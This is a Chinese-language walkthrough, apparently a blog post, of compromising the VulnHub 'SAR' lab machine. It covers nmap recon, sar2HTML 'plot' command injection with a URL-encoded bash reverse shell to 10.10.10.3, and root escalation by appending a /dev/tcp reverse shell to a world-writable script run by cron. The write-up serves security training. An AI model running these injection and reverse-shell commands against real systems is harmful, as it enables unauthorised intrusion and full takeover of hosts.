+++
date = '2026-11-18T19:56:02+08:00'
draft = false
title = '[VulnHub靶机]SAR渗透记录'
tags = ['渗透','Vulnhub','SAR2HTML','Command Injection']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.20

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ sudo arp-scan -l                                     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.20     00:0c:29:cc:27:0c       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.20        
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 19:59 +0800
Nmap scan report for 10.10.10.20
Host is up (0.00060s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:CC:27:0C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ sudo nmap -sT -sV -sC -O -p80 10.10.10.20             
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 19:59 +0800
Nmap scan report for 10.10.10.20
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:CC:27:0C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 6.0 (96%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), OpenWrt 21.02 (Linux 5.4) (96%), Linux 5.0 - 5.14 (95%), Linux 4.19 (94%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.4 - 5.10 (93%), Linux 2.6.32 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

漏洞扫描, 发现/robots.txt和/phpinfo.php

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ sudo nmap --script=vuln -p80 10.10.10.20             
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 20:01 +0800
Nmap scan report for 10.10.10.20
Host is up (0.00025s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|_  /phpinfo.php: Possible information file
MAC Address: 00:0C:29:CC:27:0C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.51 seconds
```

## Web渗透

访问80端口, 是Apache服务器在Ubuntu上的默认页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/SAR/%E8%AE%BF%E9%97%AE80%E6%9C%8D%E5%8A%A1.avif)

访问/robots.txt, 返回字符串"sar2HTML"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/SAR/%E8%AE%BF%E9%97%AErobots.txt.avif)

访问/sar2HTML

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/SAR/%E8%AE%BF%E9%97%AEsar2HTML.avif)

点击New, 发现可以上传文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/SAR/%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.avif)

但是上传后我们不知道文件的位置, 无法利用, 使用searchsploit搜索现有漏洞

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ searchsploit sar2html
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                            | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                | php/webapps/47204.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/SAR]
└─$ searchsploit -m 47204
  Exploit: Sar2HTML 3.2.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47204
     Path: /usr/share/exploitdb/exploits/php/webapps/47204.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/SAR/47204.txt

┌──(kali㉿kali)-[~/SAR]
└─$ cat 47204.txt 
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.
```

那么就很明确了, 我们试一下, 访问`http://10.10.10.20/sar2HTML/index.php?plot=;whoami`, 会发现"Select Host"列表果然返回了当前用户名

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/SAR/%E5%8F%91%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.avif)

攻击机开启监听, 访问`http://10.10.10.20/sar2HTML/index.php?plot=;bash+-c+%22bash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%22`即可获得shell

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.20] 55262
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sar:/var/www/html/sar2HTML$
```

## 权限提升

### 终端升级

靶机没有python, 我们使用script升级终端

```shell
www-data@sar:/var/www/html/sar2HTML$ script /dev/null -c bash
```

### 枚举

在love的桌面中得到user.txt

```shell
www-data@sar:/home/love/Desktop$ ls -lah
ls -lah
total 12K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..
-rw-r--r--  1 love love   33 Oct 20  2019 user.txt
www-data@sar:/home/love/Desktop$ cat user.txt
cat user.txt
427a7e47deb4a8649c7cab38df232b52
```

翻了一圈, 在/var中发现backups文件夹

```shell
www-data@sar:/var$ ls -lah
ls -lah
total 60K
drwxr-xr-x 15 www-data www-data 4.0K Oct 20  2019 .
drwxr-xr-x 24 root     root     4.0K Oct 20  2019 ..
drwxr-xr-x  2 www-data www-data 4.0K Nov 18 17:32 backups
drwxr-xr-x 17 www-data www-data 4.0K Oct 21  2019 cache
drwxrwsrwt  2 www-data www-data 4.0K Aug  6  2019 crash
drwxr-xr-x 65 www-data www-data 4.0K Oct 21  2019 lib
drwxrwsr-x  2 www-data www-data 4.0K Apr 24  2018 local
lrwxrwxrwx  1 www-data www-data    9 Oct 20  2019 lock -> /run/lock
drwxr-xr-x 13 root     syslog   4.0K Nov 19  2026 log
drwxrwsr-x  2 www-data www-data 4.0K Aug  6  2019 mail
drwxrwsrwt  2 www-data www-data 4.0K Aug  6  2019 metrics
drwxr-xr-x  2 www-data www-data 4.0K Aug  6  2019 opt
lrwxrwxrwx  1 www-data www-data    4 Oct 20  2019 run -> /run
drwxr-xr-x 13 www-data www-data 4.0K Nov 18 18:11 snap
drwxr-xr-x  6 www-data www-data 4.0K Oct 20  2019 spool
drwxrwxrwt  2 root     root     4.0K Nov 19  2026 tmp
drwxr-xr-x  4 www-data www-data 4.0K Oct 21  2019 www
```

查看里面的文件, 发现有passwd和shadow的备份, 可惜我们没有权限读取

```shell
www-data@sar:/var$ cd backups
cd backups
www-data@sar:/var/backups$ ls -lah
ls -lah
total 2.6M
drwxr-xr-x  2 www-data www-data 4.0K Nov 18 17:32 .
drwxr-xr-x 15 www-data www-data 4.0K Oct 20  2019 ..
-rw-r--r--  1 root     root      70K Oct 21  2019 alternatives.tar.0
-rw-r--r--  1 www-data www-data 3.3K Oct 20  2019 alternatives.tar.1.gz
-rw-r--r--  1 root     root      92K Oct 21  2019 apt.extended_states.0
-rw-r--r--  1 www-data www-data   11 Oct 20  2019 dpkg.arch.0
-rw-r--r--  1 www-data www-data   43 Oct 20  2019 dpkg.arch.1.gz
-rw-r--r--  1 www-data www-data   43 Oct 20  2019 dpkg.arch.2.gz
-rw-r--r--  1 www-data www-data  280 Oct 20  2019 dpkg.diversions.0
-rw-r--r--  1 www-data www-data  160 Oct 20  2019 dpkg.diversions.1.gz
-rw-r--r--  1 www-data www-data  160 Oct 20  2019 dpkg.diversions.2.gz
-rw-r--r--  1 www-data www-data  302 Oct 20  2019 dpkg.statoverride.0
-rw-r--r--  1 www-data www-data  206 Oct 20  2019 dpkg.statoverride.1.gz
-rw-r--r--  1 www-data www-data  190 Aug  6  2019 dpkg.statoverride.2.gz
-rw-r--r--  1 root     root     1.5M Oct 21  2019 dpkg.status.0
-rw-r--r--  1 www-data www-data 420K Oct 20  2019 dpkg.status.1.gz
-rw-r--r--  1 www-data www-data 399K Oct 20  2019 dpkg.status.2.gz
-rw-------  1 root     root      947 Oct 21  2019 group.bak
-rw-------  1 root     shadow    787 Oct 21  2019 gshadow.bak
-rw-------  1 root     root     2.5K Oct 20  2019 passwd.bak
-rw-------  1 root     shadow   1.3K Oct 21  2019 shadow.bak
```

在Web目录中, 发现两个脚本文件`finally.sh`和`write.sh`

```shell
www-data@sar:/var/www/html$ ls -lah
ls -lah
total 40K
drwxr-xr-x 3 www-data www-data 4.0K Oct 21  2019 .
drwxr-xr-x 4 www-data www-data 4.0K Oct 21  2019 ..
-rwxr-xr-x 1 root     root       22 Oct 20  2019 finally.sh
-rw-r--r-- 1 www-data www-data  11K Oct 20  2019 index.html
-rw-r--r-- 1 www-data www-data   21 Oct 20  2019 phpinfo.php
-rw-r--r-- 1 root     root        9 Oct 21  2019 robots.txt
drwxr-xr-x 4 www-data www-data 4.0K Oct 20  2019 sar2HTML
-rwxrwxrwx 1 www-data www-data   30 Oct 21  2019 write.sh
```

`finally.sh`的作用是运行write.sh脚本, 只有root权限能修改, 其它用户只能读取和执行

```sh
#!/bin/sh

./write.sh
```

`write.sh`的作用是创建gateway文件, 我们当前的www-data用户对其有写权限

```sh
#!/bin/sh

touch /tmp/gateway
```

如果我们把改`write.sh`改为反弹shell脚本, 再以root身份执行`finally.sh`, 那么`write.sh`也会以root身份执行, 进而给我们反弹回一个rootshell

查看系统定时任务

```shell
www-data@sar:/var/www/html/sar2HTML$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

系统每隔5分钟会自动以root身份执行finally.sh, 这正好符合我们的需要  
攻击机开启监听, 写入反弹shell代码

```shell
www-data@sar:/var/www/html$ echo '/bin/bash -c "/bin/bash -i >&/dev/tcp/10.10.10.3/5555 0>&1"' >> ./write.sh
```

等待5分钟, 即可拿到rootshell

```shell
┌──(kali㉿kali)-[~/SAR]
└─$ rlwrap nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.20] 56978
bash: cannot set terminal process group (1725): Inappropriate ioctl for device
bash: no job control in this shell
root@sar:/var/www/html# whoami
root
```

读取flag

```shell
root@sar:/var/www/html# cd /root
root@sar:~# ls -lah
total 44K
drwx------  6 root root 4.0K Nov 18 17:34 .
drwxr-xr-x 24 root root 4.0K Oct 20  2019 ..
-rw-------  1 root root  501 Oct 21  2019 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Aug  6  2019 .cache
drwx------  3 root root 4.0K Oct 20  2019 .gnupg
drwxr-xr-x  3 root root 4.0K Oct 20  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Oct 20  2019 root.txt
drwx------  7 root root 4.0K Nov 18 17:40 snap
-rw-r-----  1 root root    5 Nov 18 18:40 .vboxclient-display-svga.pid
root@sar:~# cat root.txt
66f93d6b2ca96c9ad78a8a9ba0008e99
```
